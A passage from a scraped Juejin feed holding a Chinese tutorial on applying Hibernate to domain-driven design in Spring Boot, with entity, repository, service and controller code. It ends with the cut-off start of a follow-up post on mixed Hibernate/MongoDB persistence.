  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T23:40:03.000Z" title="Fri Jan 30 2026 23:40:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在领域驱动设计（DDD）中使用Hibernate，可以通过以下步骤实现。DDD关注的是将业务逻辑封装在领域对象和领域服务中，并通过存储库（Repository）模式处理持久化。Hibernate作为ORM（对象关系映射）工具，可以很好地处理领域对象的持久化。</p>
<p>下面我们展示如何在Spring Boot项目中结合Hibernate实现DDD。</p>
<h3 data-id="heading-0">1. 项目依赖</h3>
<p>在<code>pom.xml</code>中添加必要的依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Web --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. 配置数据源和Hibernate属性</h3>
<p>在<code>application.properties</code>中配置数据源：</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect
</code></pre>
<h3 data-id="heading-2">3. 创建领域模型</h3>
<p>在DDD中，领域模型代表业务概念和规则。</p>
<h4 data-id="heading-3"><code>Order.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;

    <span class="hljs-meta">@OneToMany(cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-meta">@JoinColumn(name = "order_id")</span>
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.add(item);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.remove(item);
    }

    <span class="hljs-comment">// Business logic methods</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> items.stream().mapToDouble(OrderItem::getTotalPrice).sum();
    }
}
</code></pre>
<h4 data-id="heading-4"><code>OrderItem.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "order_items")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity * price;
    }
}
</code></pre>
<h3 data-id="heading-5">4. 创建仓储接口</h3>
<p>仓储接口用于持久化领域对象。</p>
<h4 data-id="heading-6"><code>OrderRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h3 data-id="heading-7">5. 创建领域服务</h3>
<p>领域服务用于处理复杂的业务逻辑，通常涉及多个领域对象。</p>
<h4 data-id="heading-8"><code>OrderService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-keyword">return</span> orderRepository.save(order);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">return</span> orderRepository.findById(id).orElse(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h3 data-id="heading-9">6. 创建应用服务</h3>
<p>应用服务负责与用户交互，并调度领域服务来处理业务逻辑。</p>
<h4 data-id="heading-10"><code>OrderApplicationService.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderApplicationService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(String customerName, String customerAddress, List&lt;OrderItem&gt; items)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setCustomerName(customerName);
        order.setCustomerAddress(customerAddress);
        <span class="hljs-keyword">for</span> (OrderItem item : items) {
            order.addItem(item);
        }
        <span class="hljs-keyword">return</span> orderService.createOrder(order);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Long id, String customerName, String customerAddress, List&lt;OrderItem&gt; items)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.getOrderById(id);
        <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Order not found"</span>);
        }
        order.setCustomerName(customerName);
        order.setCustomerAddress(customerAddress);
        order.getItems().clear();
        <span class="hljs-keyword">for</span> (OrderItem item : items) {
            order.addItem(item);
        }
        <span class="hljs-keyword">return</span> orderService.updateOrder(order);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderService.deleteOrder(id);
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-keyword">return</span> orderService.getOrderById(id);
    }
}
</code></pre>
<h3 data-id="heading-11">7. 创建控制器</h3>
<p>控制器负责处理HTTP请求，并与应用服务交互。</p>
<h4 data-id="heading-12"><code>OrderController.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderApplicationService orderApplicationService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CreateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderApplicationService.createOrder(
                request.getCustomerName(), request.getCustomerAddress(), request.getItems());
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> UpdateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderApplicationService.updateOrder(
                id, request.getCustomerName(), request.getCustomerAddress(), request.getItems());
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderApplicationService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderApplicationService.getOrderById(id);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(order);
    }
}
</code></pre>
<h4 data-id="heading-13"><code>CreateOrderRequest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h4 data-id="heading-14"><code>UpdateOrderRequest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UpdateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h3 data-id="heading-15">8. 运行应用</h3>
<ol>
<li><strong>启动MySQL</strong>：确保你的MySQL数据库运行在<code>localhost:3306</code>。</li>
<li><strong>创建数据库</strong>：创建一个名为<code>mydatabase</code>的数据库。</li>
<li><strong>启动Spring Boot应用</strong>：运行Spring Boot应用程序。</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:run
</code></pre>
<h3 data-id="heading-16">9. 访问API</h3>
<p>通过以下API访问<code>Order</code>数据：</p>
<ul>
<li><code>POST /orders</code>：创建Order。</li>
<li><code>PUT /orders/{id}</code>：更新Order。</li>
<li><code>DELETE /orders/{id}</code>：删除Order。</li>
<li><code>GET /orders/{id}</code>：按ID获取Order。</li>
</ul>
<h3 data-id="heading-17">总结</h3>
<p>通过上述步骤，我们展示了如何在DDD中使用Hibernate，包括定义领域模型、创建仓储接口、实现领域服务和应用服务以及创建控制器。在DDD中，重点是将业务逻辑封装在领域对象和领域服务中，通过存储库模式处理持久化。Hibernate作为ORM工具，可以很好地处理领域对象的持久化，从而实现清晰的业务逻辑和持久化逻辑分离。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（76）如何在混合持久化环境中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7600955777316519974</link>    <guid>https://juejin.cn/post/7600955777316519974</guid>    <pubDate>2026-01-30T23:40:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316519974" data-draft-id="7600953879501406259" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（76）如何在混合持久化环境中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-30T23:40:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（76）如何在混合持久化环境中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T23:40:58.000Z" title="Fri Jan 30 2026 23:40:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在混合持久化环境中使用Hibernate，意味着使用不同的数据库或存储技术来处理不同的数据持久化需求。例如，可以同时使用关系型数据库（如MySQL）和NoSQL数据库（如MongoDB）。这种方法在CQRS（Command Query Responsibility Segregation）或其他多存储技术架构中非常常见。</p>
<p>下面我们将展示如何在Spring Boot项目中结合Hibernate和MongoDB实现混合持久化。</p>
<h3 data-id="heading-0">1. 项目依赖</h3>
<p>在<code>pom.xml</code>中添加必要的依赖：</p>
